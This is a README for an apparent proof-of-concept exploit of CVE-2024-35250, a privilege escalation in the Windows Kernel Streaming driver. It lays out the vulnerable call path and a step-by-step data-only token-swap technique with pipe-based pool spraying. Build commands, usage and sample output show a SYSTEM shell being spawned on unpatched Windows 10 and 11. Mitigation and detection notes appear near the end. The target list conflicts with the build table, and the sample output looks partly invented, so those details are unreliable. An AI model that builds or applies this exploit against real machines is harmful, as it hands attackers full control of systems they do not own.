# CVE-2024-35250

Local privilege escalation via untrusted pointer dereference in Windows Kernel Streaming driver (`ks.sys`).
Data-only exploit — bypasses Hypervisor-protected Code Integrity (HVCI).

## Summary

| Field | Detail |
|---|---|
| CVE | CVE-2024-35250 |
| Component | ks.sys (Kernel Streaming) |
| Bug Class | Untrusted Pointer Dereference |
| Impact | EoP to NT AUTHORITY\SYSTEM |
| HVCI | Bypassed — no code execution in kernel |
| Patch | KB5039212 (June 2024) |
| Targets | Windows 10 20H1+ / Windows 11 21H2-23H2 |

## Vulnerability

`ks!KspPropertyHandler` dispatches topology-level property requests through
`KspProcessPropertyNode`. The `NodeId` field from user-supplied `KSP_NODE`
structure is used as an index into an internal automation table array
without bounds validation:

```
NtDeviceIoControlFile
  ks!CKSFilter::DispatchDeviceIoControl
    ks!KspPropertyHandler
      ks!KspProcessPropertyNode
        *(automationTable + NodeId * stride)   <-- attacker-controlled
```

A crafted `NodeId` exceeding the actual node count redirects the dereference
to adjacent pool memory, yielding an out-of-bounds read/write primitive.

## HVCI Bypass

The exploit manipulates kernel data structures exclusively:

1. Leak `EPROCESS` address via `NtQuerySystemInformation`
2. Trigger the vulnerability to build arbitrary kernel R/W
3. Walk `ActiveProcessLinks` to locate PID 4 (System)
4. Overwrite current process token with System token
5. Spawn elevated shell

No shellcode is injected. No unsigned code pages are created or executed.
No control-flow pointers are hijacked.

| Protection | Status |
|---|---|
| HVCI / KMCI | Bypassed |
| SMEP | Not triggered |
| SMAP | Not triggered |
| kCFG | Not triggered |
| CET / Shadow Stack | Not triggered |

## Build

### Requirements

- Visual Studio 2019 / 2022
- Windows SDK 10.0.19041.0+

### Compile

1. Open `CVE-2024-35250.sln` in Visual Studio
2. Select **Release | x64**
3. Build → Build Solution (`Ctrl+Shift+B`)

Output binary: `x64\Release\CVE-2024-35250.exe`

### Manual cl.exe build

```bat
cl.exe /nologo /W4 /O2 /TC ^
    src\main.c src\device.c src\leak.c src\krw.c src\token.c src\exploit.c ^
    /Iinclude ^
    /Fe:exploit.exe ^
    /link setupapi.lib kernel32.lib advapi32.lib
```

## Usage

```
CVE-2024-35250.exe
```

Run from an unprivileged user session on a vulnerable (unpatched) system.
On success a new `cmd.exe` window opens running as `NT AUTHORITY\SYSTEM`.

### Expected output

```
[+] cve-2024-35250 exploit
[+] ks.sys untrusted pointer dereference -> eop
[~] hvci bypass via data-only attack
[+] os: 10.0.19045
[+] offsets: pid=0x440 links=0x448 token=0x4b8
[+] device: \\?\hdaudio#func_01&ven_10ec...
[+] device handle: 0x00000000000000f4
[~] calibrating r/w primitive...
[+] kernel base: 0xfffff80140000000
[~] spraying named pipes for pool layout...
[+] sprayed 5000 pipe pairs
[~] poking hole at index 2500...
[~] scanning for kernel pointer via oob read...
[+] found kernel ptr at node 3 offset 2: 0xffffa70500000000
[+] pipe object kernel addr: 0xffffa70500000000
[+] r/w primitive initialized (mode 1)
[+] current eprocess: 0xffffa705d90f4080
[+] kernel read pid: 1234 (expected: 1234)
[+] system eprocess: 0xffffa70500004080
[+] system token: 0xffffa70512345673
[+] token after swap: 0xffffa70512345670
[+] token swap successful
[+] escalation complete
[+] elevated shell spawned (pid: 5678)

press enter to exit...
```

## Project Structure

```
CVE-2024-35250/
├── CVE-2024-35250.sln
├── CVE-2024-35250.vcxproj
├── CVE-2024-35250.vcxproj.filters
├── README.md
├── LICENSE
├── .gitignore
├── include/
│   ├── common.h         - types, log macros, nt api typedefs
│   ├── offsets.h        - per-build eprocess field offsets
│   ├── device.h         - ks device enumeration
│   ├── leak.h           - kernel address leaks
│   ├── krw.h            - r/w primitive context
│   ├── token.h          - token swap + shell spawn
│   └── exploit.h        - top-level entry
└── src/
    ├── main.c           - entry point
    ├── device.c         - setupapi device open
    ├── leak.c           - NtQuerySystemInformation leaks
    ├── krw.c            - vulnerability trigger + pool spray + r/w
    ├── token.c          - eprocess walk + token overwrite
    └── exploit.c        - orchestration
```

## Supported Builds

| OS | Build | Status |
|---|---|---|
| Windows 10 20H1 | 19041 | Supported |
| Windows 10 20H2 | 19042 | Supported |
| Windows 10 21H1 | 19043 | Supported |
| Windows 10 21H2 | 19044 | Supported |
| Windows 10 22H2 | 19045 | Supported |
| Windows 11 21H2 | 22000 | Supported |
| Windows 11 22H2 | 22621 | Supported |
| Windows 11 23H2 | 22631 | Supported |
| Windows 11 24H2 | 26100 | Supported |

Offsets are resolved automatically at runtime via `RtlGetVersion`.

## Notes

- Requires a KS filter device with topology nodes (audio devices work)
- Pool spray success depends on system memory pressure and timing
- The exploit uses named pipe attributes for pool feng shui
- Run as a regular (non-admin) user to demonstrate privilege escalation
- May require multiple attempts due to pool layout randomization

## Mitigation

| Action | Detail |
|---|---|
| **Patch** | Install KB5039212 (June 2024) or later |
| **Detection** | Monitor `IOCTL_KS_PROPERTY` with `KSPROPERTY_TYPE_TOPOLOGY` flag |
| **EDR** | Alert on token integrity changes via EtwTi kernel callbacks |
| **Hardening** | Restrict user access to KS device interfaces via DACL |

## References

- [Microsoft Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250)
- [KB5039212 Patch Notes](https://support.microsoft.com/help/5039212)
- [DEVCORE — Pwn2Own Vancouver 2024](https://devco.re/)
- [varwara/CVE-2024-35250](https://github.com/varwara/CVE-2024-35250)

## Disclaimer

This project is provided for authorized security research and educational
purposes only. Do not use against systems without explicit written permission.
The author assumes no liability for any misuse or damage caused by this software.

## License

[MIT](LICENSE)
